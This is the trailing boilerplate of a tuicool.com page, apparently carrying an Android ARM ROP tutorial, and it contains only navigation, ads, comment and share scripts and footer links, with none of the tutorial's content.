$("#share_weixin_id").click( function() {
  $("#share_weixin_image").toggle();
});
</script>


        </div>
        <div id="site_articles" style="clear:both;">
              <div class="article-part-title">
                <span>推荐文章</span>
              </div>
          <ul class="side_article_list">
                <li class="side_article_list_item">
                    1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛">
                    掌握这17个tar命令实例让你秒变大牛
                    </a>
                </li>
                <li class="side_article_list_item">
                    2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数">
                    实例详解 Linux 中的 fork() 函数
                    </a>
                </li>
                <li class="side_article_list_item">
                    3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试">
                    每日一博 | 关于 CPU 亲和性的测试
                    </a>
                </li>
                <li class="side_article_list_item">
                    4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9">
                    SIGKILL信号linux下kill进程 -9
                    </a>
                </li>
                <li class="side_article_list_item">
                    5.<a href="/articles/j6Bfuqv" target="_blank" title="堡垒跳板机实现——架构实现">
                    堡垒跳板机实现——架构实现
                    </a>
                </li>
                <li class="side_article_list_item">
                    6.<a href="/articles/FNjAvab" target="_blank" title="ELF文件格式分析">
                    ELF文件格式分析
                    </a>
                </li>
          </ul>
        </div>
        <div id="kan_articles"></div>
        <div id="article_weibo" style="display:none;">
            <div class='article-part-title'>
                <span>相关微博</span>
                <sub>
                    <a href="/articles/weibo_list/zUR7nav" target="_blank">(<i id="weibo_num"></i>)</a> 
               </sub>
            </div>
            <div class="related-weibo-list"></div>
        </div>
        <div class="comments">
    <div class="comments-area">
    <div class="comments-header">
        <h5>我来评几句</h5>
        <div class="alert comment-alert alert-error" style="display:none;">
            错误
        </div>
           <textarea name="comment[body]" id="comment-body" cols="60" rows="6" placeholder="请输入评论内容..." style="resize: none;"></textarea>
           <a href="javascript:commentsub();" class="btn btn-medium btn-submit" id="comment-submit">发表评论</a>
        <p style="margin-top: 5px;margin-left:10px;">
            已发表评论数(<span class="comment_cnt"></span>)
        </p>
    </div>
    <div class="comments-list">
        <div class="empty-cmts alert alert-success" style="display:none;">
            没有更多评论了^^
        </div>
    </div>
    <div class="more-comments" style="display:none;">
        <a href="">更多评论</a>
    </div>
    <div class="load-fail">
        评论加载失败，<a href="javascript:reload_comments('zUR7nav',1,0,1);">重新加载</a>
        <img src="http://static1.tuicool.com//images/spinner.gif" id="spinner3"/>
    </div>
    </div>
</div>

    </div>
        <div class="span4 article_right_side">
            <div class="article_related_site article_detail_bg">
    <h4 class="article-part-title">相关站点</h4>
    <div class="article_related_site_body clearfix">
        <div class="logo">
            <img src="http://stimg2.tuicool.com/a2UJrq.png"/>
        </div>
        <div class="name">
            <div>
                <a href="/sites/a2UJrq" target="_blank"> WooYun知识库</a>
            </div>
            <div>
                <div class="btn right_site_follow" >已订阅</div>
            </div>
        </div>
    </div>
</div>

<div id="right_site_articles" class="article_detail_bg">
    <div class="article-part-title">
        <span>热门文章</span>
    </div>
    <ul class="side_article_list">
        <li class="side_article_list_item">
            1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛"> 掌握这17个tar命令实例让你秒变大牛 </a>
        </li>
        <li class="side_article_list_item">
            2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数"> 实例详解 Linux 中的 fork() 函数 </a>
        </li>
        <li class="side_article_list_item">
            3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试"> 每日一博 | 关于 CPU 亲和性的测试 </a>
        </li>
        <li class="side_article_list_item">
            4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9"> SIGKILL信号linux下kill进程 -9 </a>
        </li>
        <li class="side_article_list_item">
            5.<a href="/articles/Z3UBvm6" target="_blank" title="GPG 密鑰的「正確」用法"> GPG 密鑰的「正確」用法 </a>
        </li>
    </ul>
</div>
<div class="right-link">
      <a href="http://click.aliyun.com/m/6128/" target="_blank"><img src="http://static1.tuicool.com/images/upload/aliyun120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="http://www.toushibao.com/landing.html?utm_source=tuicoolwenzhang&utm_medium=guanggao&utm_campaign=tuicoolwenzhang.guanggao.tsbxgn" target="_blank"><img src="http://static1.tuicool.com/images/upload/jiankongbao120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="http://www.handone.com/?f=tc" target="_blank"><img src="http://static1.tuicool.com/images/upload/handone300.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 0px">
      <a href="https://www.daocloud.io/cloud/voice.html?utm_source=tuicool&utm_medium=banner%20&utm_campaign=daovoicecampaign" target="_blank"><img src="http://static1.tuicool.com/images/upload/daocloud300.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.jiguang.cn/devservice/?from=tuicool01" target="_blank"><img src="http://static1.tuicool.com/images/upload/jpush120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.teambition.com/?utm_source=tuicool&utm_medium=banner01" target="_blank"><img src="http://static2.tuicool.com/images/upload/teambition120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.jiandaoyun.com/?f=tc" target="_blank"><img src="http://static0.tuicool.com/images/upload/jiandaoyun120.jpg"/></a>

</div>
<div class="frd_pos">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:250px"
     data-ad-client="ca-pub-7054762349007490"
     data-ad-slot="5705695566"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

</div>

         </div>
</div>

<div>
   <!-- add_article to kan -->
<div id="add-article-to-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-header">
    <span class="add-title">收藏到推刊</span>
    <a href="#new-kan" class="btn pull-right" data-toggle="modal">创建推刊</a>
    <i class="clearfix"></i>
  </div>
  <div class="modal-body">
    <ul id="add-kan-list">
    </ul>
  </div>
  <div class="modal-footer">
    <input type="hidden" value="zUR7nav" class="article-id" /> 
    <button class="btn btn-primary pull-left add-to-btn">  收 藏  </button>
    <button class="btn" data-dismiss="modal" aria-hidden="true" style="margin-right: 15px">取消</button>
  </div>
</div>

   <div id="new-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-body">
    <input type="text" name="name" id="new-kan-name"  placeholder="推刊名(必填)" required data-validation-required-message="请填写推刊名" />
    <span class="new-ness-name">请填写推刊名</span>
    <br/>
    <textarea name="desc" id="desc" rows="6" placeholder="推刊描述"></textarea>
    <span class="new-ness-desc">描述不能大于100个字符!</span>
    <br/>
    权限设置：<input type="radio" name="type" value="1" checked="checked" /> 公开
    <input type="radio" name="type" value="0"> 仅自己可见
  </div>
  <div class="modal-footer">
    <button class="btn btn-primary pull-left create-kan-btn" disabled>创建</button>
    <button class="btn dismiss-new-kan" data-dismiss="modal" aria-hidden="true">取消</button>
  </div>
</div>


</div>
<div id="article-correct-modal" class="modal hide fade in" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
            &times;
        </button>
        <h3>文章纠错</h3>
    </div>
    <div class="modal-body">
        <input type="hidden" value="zUR7nav" id="article-correct-source">
        <div>
            <label for="article-correct-select">
                错误类型
            </label>
            <select id="article-correct-select">
                <option value="正文不准确">正文不准确</option>
                <option value="标题不准确">标题不准确</option>
                <option value="排版有问题">排版有问题</option>
                <option value="排版有问题">主题不准确</option>
                <option value="没有分页内容">没有分页内容</option>
                <option value="图片无法显示">图片无法显示</option>
                <option value="视频无法显示">视频无法显示</option>
                <option value="与原文不一致">与原文不一致</option>
            </select>
        </div>
        <div>
            <label for="article-correct-other">
                补充信息
            </label>
            <textarea id="article-correct-other" class="span4"></textarea>
        </div>
    </div>
    <div class="modal-footer">
        <button class="btn btn-primary pull-right huodong_correct_submit" id="article-correct-submit">
            &nbsp;&nbsp;提交&nbsp;&nbsp;
        </button>
    </div>
</div>
    <div class="share_zone">
    <div class="bdsharebuttonbox"> 
         <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
        <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
        <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
        <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a>
        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
        <a href="#" class="bds_more" data-cmd="more"></a>
     </div>
    <script>
        window._bd_share_config = {
            "common" : {
                "bdSnsKey" : {
                    "tsina" : "3113829255",
                    "tqq" : "801536792"
                },
                "bdText" : "一步一步学ROP之Android ARM 32位篇 (分享自 @推酷网)",
                "bdMini" : "2",
                "bdMiniList" : false,
                "bdPic" : "http://aimg2.tuicool.com/3ENziy.png",
                "bdStyle" : "1",
                "bdSize" : "24"
            },
            "slide" : {
                "type" : "slide",
                "bdImg" : "1",
                "bdPos" : "left",
                "bdTop" : "200"
            }
        };
        with (document)
        0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];
    </script>
</div>

<style type="text/css">
    .btn-large {
        padding: 0;
    }
    .load-fail {
        display: none;
    }
</style>
<script src="http://static1.tuicool.com//assets/highlight.pack.js"></script>
<script type="text/javascript">
    $('table').each(function(i) {
        var size = $(this).children().size();
        if (size > 1) {
            $(this).attr('class',"table table-bordered");
        } else if (size == 1) {
            var e11 = $(this).children(":first");
            var e1 = e11[0];
            var name = e1.nodeName.toLowerCase();
            if ("tbody" == name) {
                if (e1.children.length > 1) {
                    $(this).attr('class',"table table-bordered");
                } else if (e1.children.length == 1){
                    var e12 = e1.children[0];
                    var name2 = e12.nodeName.toLowerCase();
                    if ("tr" == name2) {
                       if (e12.children.length > 1) {
                         $(this).attr('class',"table table-bordered");
                       }
                    }
                }
            }
        }
    });
            related_kan("zUR7nav");
        window.page = 0;
        window.last = 0;    
        window.first = true;
        resize_article_image('#nei', 550);
                load_comments("zUR7nav",1,0,"MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451");
                window.uid = parseInt("155792");
        open_add_article_to_kan("true");
        async_do_zan_article(); 
        $('pre').each(function(i, e) {
            hljs.highlightBlock(e, "<span class='indent'>  </span>", false)
        });
       
          function commentsub(){  
    $.ajaxSetup({
    error:function(x,e){        
      $('.comment-alert').text("系统出现问题，请稍候再试").show();
      $('textarea').attr('disabled',false);
      return false;
    },
    headers: {
      'X-CSRF-Token': $('meta[name="csrf-token"]').attr('content')
    }
  }); 
    $("#comment-body").attr("disabled",true);
    $("#comment-submit").addClass("disabled");
    $("#comment-submit").attr("href","#comment-body");
    text = $("#comment-body").val();
    if(text.length < 2 ){
        $('.comment-alert').text("你的字数太少了").show();
        reset_submit_btn();
    }else if(text.length > 500){
        $('.comment-alert').text("你的字数太多了,不能超过500字!").show();
        reset_submit_btn();
    }else{      
    $.post("/comments.json", { aid: "zUR7nav", html_body: $("#comment-body").val(), auth: "MTU1Nzky+cefc514b570d92b90ea1fd1a5e720fa78d2ca451"},function(data){
      if(data.success == true){
        $(".comments-list").show();
        var aComment = data.comment;
        var text = aComment.content;
        var id = "zUR7nav";
        var title = "一步一步学ROP之Android ARM 32位篇";
        var share_code = "<ul class='dropdown-menu'><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tsina&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>新浪微博</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=tqq&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @tuicool）'>腾讯微博</a></li><li><a target='blank' href='http://s.evernote.com/grclip?url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>印象笔记</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=douban&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>豆瓣</a></li><li><a target='blank' href='http://share.baidu.com/s?type=text&amp;searchPic=0&amp;sign=on&amp;to=renren&amp;url=http://www.tuicool.com/articles/"+id+"&amp;title=分享评论:"+text+" //"+title+"（分享自 @推酷网）'>人人网</a></li></ul>"
        $(".comments-list").prepend("<div class='single' id='c-"+aComment.id+"'><img src='"+aComment.avatar+"' class='img avatar'><div class='comment-item' style='padding:0 0 0 5px;'><div class='info mine'>"+"<a class='uname' href='/user/"+ aComment.uid+ "' target='_blank'>"+ aComment.username  +"</a>" +"<span class='timestamp'>" +aComment.timestamp +"</span> <div class='reply dropdown'><a class='dropdown-toggle share' data-toggle='dropdown' href='javascript:share("+aComment.id+");'>分享<b class='caret'></b></a> | <a href='javascript:reply(\""+aComment.username+"\");'>回复</a>"+share_code+"</div> "+ "</div><div class='body' id='comment-"+aComment.id+"'>" + aComment.content + "</div></div></div>");
        $("#comment-body").attr("disabled",false).val("");
        $("#comment-submit").removeClass("disabled");
        $("#comment-submit").attr("href","javascript:commentsub();");
        location = "#c-"+aComment.id
        $('.empty-cmts').hide();
        $('.comment-alert').hide();
        $('.comment_cnt').text(parseInt($('.comment_cnt').text())+1);
       } else{
        $('.comment-alert').text(data.error).show();
        reset_submit_btn();
       }
    },"json");
    }
}
function reset_submit_btn() {
  $('textarea').attr('disabled',false);
  $("#comment-submit").removeClass("disabled");
  $("#comment-submit").attr("href","javascript:commentsub();");
}

       handle_follow_site("#my_follow","已订阅","+ 订阅");
</script>


    <div class="loader-inner ball-pulse ball-loading-center" id="page-loading" style="display: none">
      <div></div>
      <div></div>
      <div></div>
    </div>
    <div class="read-later-alert"></div>
  </div>

    <div class="footer">
    <div class="footer-inner">
    <dl class="about-link site-link">
        <dt>
            网站相关
        </dt>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/about">关于我们</a>
        </dd>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/mobile">移动应用</a>
        </dd>
        <dd>
            <a target="_blank" href="http://www.tuicool.com/bbs/go/issues">建议反馈</a>
        </dd>
    </dl>
    <dl class="site-link follow-link">
        <dt>
            关注我们
        </dt>
        <dd>
            <a target="_blank" href="http://e.weibo.com/tuicool2012"><img src="http://static1.tuicool.com/images/weibo-32.png">推酷网</a>
        </dd>
        <dd><img src="http://static1.tuicool.com/images/weixin-32.png">tuicool2012
        </dd>
    </dl>
    <dl class="site-link links">
        <dt>
            友情链接
        </dt>
        <dd>
                <a href="http://www.woshipm.com/" title="人人都是产品经理" target="_blank">人人都是产品经理</a>
                <a href="http://www.pm265.com/" title="PM256" target="_blank">PM256</a>
                <a href="http://www.yidonghua.com/" title="移动信息化" target="_blank">移动信息化</a>
                <a href="http://www.snsiu.com/" title="行晓网" target="_blank">行晓网</a>
                <a href="http://www.taskcity.com/" title="智城外包网" target="_blank">智城外包网</a>
                <a href="http://www.huxiu.com/" title="虎嗅" target="_blank">虎嗅</a>
                <a href="http://www.iterduo.com/" title="IT耳朵" target="_blank">IT耳朵</a>
                <a href="http://mediaworks.caixin.com/" title="创媒工场" target="_blank">创媒工场</a>
                <a href="http://www.managershare.com/" title="经理人分享" target="_blank">经理人分享</a>
                <a href="http://www.shichangbu.com/" title="市场部网" target="_blank">市场部网</a>
                <a href="http://www.ikanchai.com/" title="砍柴网" target="_blank">砍柴网</a>
                <a href="http://www.cocoachina.com/" title="CocoaChina" target="_blank">CocoaChina</a>
                <a href="http://www.ibeifeng.com/" title="北风网" target="_blank">北风网</a>
                <a href="http://www.jiankongbao.com/" title="云智慧" target="_blank">云智慧</a>
                <a href="http://www.wyzc.com" title="我赢职场" target="_blank">我赢职场</a>
                <a href="http://www.thebigdata.cn/" title="大数据时代" target="_blank">大数据时代</a>
                <a href="http://www.qidic.com/" title="奇笛网" target="_blank">奇笛网</a>
                <a href="http://www.cngulu.com/" title="咕噜网" target="_blank">咕噜网</a>
                <a href="http://www.linuxdiyf.com/" title="红联linux" target="_blank">红联linux</a>
                <a href="http://win10.ithome.com" title="Win10之家" target="_blank">Win10之家</a>
                <a href="http://www.niaogebiji.com/" title="鸟哥笔记" target="_blank">鸟哥笔记</a>
                <a href="http://www.play.cn" title="爱游戏" target="_blank">爱游戏</a>
                <a href="http://www.investide.cn/" title="投资潮" target="_blank">投资潮</a>
                <a href="http://www.31huiyi.com/" title="31会议网" target="_blank">31会议网</a>
                <a href="https://www.jiguang.cn/" title="极光推送" target="_blank">极光推送</a>
                <a href="https://www.teambition.com/" title="Teambition" target="_blank">Teambition</a>
                <a href="http://www.guigu.org/" title="硅谷网" target="_blank">硅谷网</a>
                <a href="https://home.leangoo.com/" title="leangoo" target="_blank">leangoo</a>
                <a href="http://www.zealer.com/" title="ZEALER中国" target="_blank">ZEALER中国</a>
                <a href="http://www.opensns.cn/" title="OpenSNS" target="_blank">OpenSNS</a>
                <a href="http://www.edu360.cn/" title="小牛学堂" target="_blank">小牛学堂</a>
                <a href="http://www.handone.com/" title="handone" target="_blank">handone</a>
                <a href="http://www.scrumcn.com/" title="Scrum中文网" target="_blank">Scrum中文网</a>
                <a href="http://www.bigniu.com/" title="比戈大牛" target="_blank">比戈大牛</a>
                <a href="https://www.upyun.com/" title="又拍云" target="_blank">又拍云</a>
            <a href="/links">更多链接>></a>&nbsp;&nbsp;
        </dd>
    </dl>
    <div class="clear"></div>
    </div>
</div>

<div style="display:none;">
   <script src="http://s22.cnzz.com/stat.php?id=5541078&web_id=5541078&show=pic" language="JavaScript"></script>
</div>


</body>
</html>
